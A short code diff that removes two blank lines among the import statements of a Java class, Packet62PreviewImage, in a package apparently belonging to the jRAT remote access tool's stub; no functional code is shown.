@@ -2,10 +2,8 @@ package io.jrat.stub.packets.incoming;
 
 import io.jrat.stub.Connection;
 import io.jrat.stub.packets.outgoing.Packet43PreviewImage;
-
 import java.awt.image.BufferedImage;
 import java.io.File;
-
 import javax.imageio.ImageIO;
 
 public class Packet62PreviewImage extends AbstractIncomingPacket {
